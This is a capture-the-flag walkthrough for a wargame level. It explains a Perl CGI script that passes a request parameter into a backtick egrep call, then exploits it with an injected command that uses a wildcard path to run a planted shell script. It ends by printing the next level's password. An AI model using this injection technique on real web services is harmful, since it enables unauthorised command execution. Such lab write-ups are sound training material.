We have a `.pl` file here so let’s see what we have there:

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

It implements a simple `CGI` that processes web requests and sends an HTML response.

The function `t` takes 2 arguments

- `$xx = $_[0];` retrieves the first argument.
- `$xx =~ tr/a-z/A-Z/;` converts `$xx` to uppercase.
- `$xx =~ s/\s.*//;` removes everything from the first space onwards (if any).
- It runs the Unix command `egrep "^$xx" /tmp/xd 2>&1` to search the file `/tmp/xd` for lines starting with the modified `$xx`.
- The output is captured in the `@output` array.
- The script loops through each line in the `@output` array, splitting it on the first colon (`:`).
- It checks if the second part of the line (`$s`) matches the pattern stored in `$nn` (the second input argument).
- If a match is found, it returns `1`, indicating success.
- If no match is found after checking all lines, it returns `0`.

The function `n` takes one argument

- If the argument is `1`, it prints `".."` to the HTML output (indicating success).
- Otherwise, it prints `"."` (indicating failure).

How this works in less words:

 The script expects two parameters (`x` and `y`) to be provided via a web request, such as through a form submission or URL parameters (e.g., `localhost:4646?x=value1&y=value2`).

The parameter `x` is converted to uppercase, and everything after the first space is stripped.

The script looks for lines in the file `/tmp/xd` that start with the modified `x`.

If it finds a line, it checks if the second part of the line (after the colon `:`) matches the parameter `y`.

If the pattern is found, the script prints `".."` to the HTML output. If not, it prints `"."`.

As an example:

Assume the file `/tmp/xd` contains the following lines:

```perl
HELLO:world
GOODBYE:farewell
HI:there
```

f a user sends the parameters `x=hello` and `y=world`, the script would:

- Convert `hello` to `HELLO`.
- Search `/tmp/xd` for a line that starts with `HELLO`.
- Find the line `HELLO:world`, and since `world` matches the value of `y`, the script will print `".."`.

If the user sent `x=hi` and `y=someone`, the script would:

- Convert `hi` to `HI`.
- Find the line `HI:there`, but since `there` does not match `someone`, it would print `"."`.

———————————————————————————————————————

Knowing all this, let’s check if this is working.

Let’s send a request to that port:

```perl
curl -I localhost:4646
```

As expected we get a response header

We see that the content on `@output` variable will be executed so we could think that sending `getflag>/tmp/flag` should work, but since it is uppercased we would be trying to execute `GETFLAG>/TMP/FLAG` which wouldn’t be executed. Instead we will create a file that will be executed.

Because of the first regex we have to use a wildcard in our path to the file `/*/[EXPLOITFILE]`

```perl
cd /tmp
chmod 777 EXPLOIT
vim EXPLOIT

#!/bin/sh
getflag > /tmp/flag
```

Now let’s make the request

```perl
curl localhost:4646?x='`/*/EXPLOIT`'
cat /tmp/flag
```

There is the flag so let’s go to level13

```perl
su level13
Password: g1qKMiRpXf53AWhDaU7FEkczr
```